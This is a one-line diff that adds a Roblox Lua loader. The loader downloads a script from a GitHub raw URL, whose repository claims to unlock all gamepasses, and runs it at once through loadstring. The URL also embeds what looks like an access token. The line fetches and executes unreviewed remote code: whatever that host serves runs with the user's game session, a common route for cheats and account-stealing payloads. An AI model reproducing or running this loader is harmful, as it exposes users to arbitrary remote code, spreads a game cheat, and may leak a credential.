@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IGOOOR99/REAL-SCRIPT-GET-ALL-GAMEPASSES/refs/heads/main/script?token=GHSAT0AAAAAACYQ5W7VQCN36T2NX7CPGZSUZYCUXCQ",true))()
